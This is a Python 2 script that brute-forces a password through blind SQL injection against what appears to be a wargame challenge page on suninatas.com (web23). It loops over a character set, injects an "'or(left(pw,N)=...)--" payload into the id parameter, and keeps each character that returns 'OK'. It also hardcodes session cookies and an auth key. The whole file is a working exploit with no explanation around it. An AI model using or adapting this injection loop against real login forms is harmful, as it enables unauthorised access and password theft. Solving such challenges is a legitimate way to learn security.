import urllib
import urllib2
import sys
import time

string = " abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~!@#$^&*()-_+"
key = "v"

for i in range(1,12):
	for j in range(len(string)):
		payload = "'or(left(pw,"+str(i+1)+")='"+key+string[j]+"')--"
		payload = urllib.quote(payload)
		url = "http://suninatas.com/Part_one/web23/web23.asp?id="+payload+"&pw=1"

		print url

		opener = urllib2.build_opener(urllib2.HTTPHandler)
		request = urllib2.Request(url)
		request.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36')
		request.add_header('Cookie', 'ASPSESSIONIDQSCSBBRT=ILIHJDADLBIDDOPOEHNPKHJB; auth%5Fkey=65038b0559e459420aa2d23093d01e4a; ASPSESSIONIDSSCSBAQS=EBPGPBICILNOGEFLFIBMANEM')
		request.get_method = lambda:'GET'
		data = opener.open(request)
		data = data.read()

		if "OK" in data:
			key += string[j]
			print "[*] Find Password!! Password is ["+key+"]"
			break
		else:
			print "[-] Fail!"
		time.sleep(0.1)
print "[*] Key is ["+key+"]"
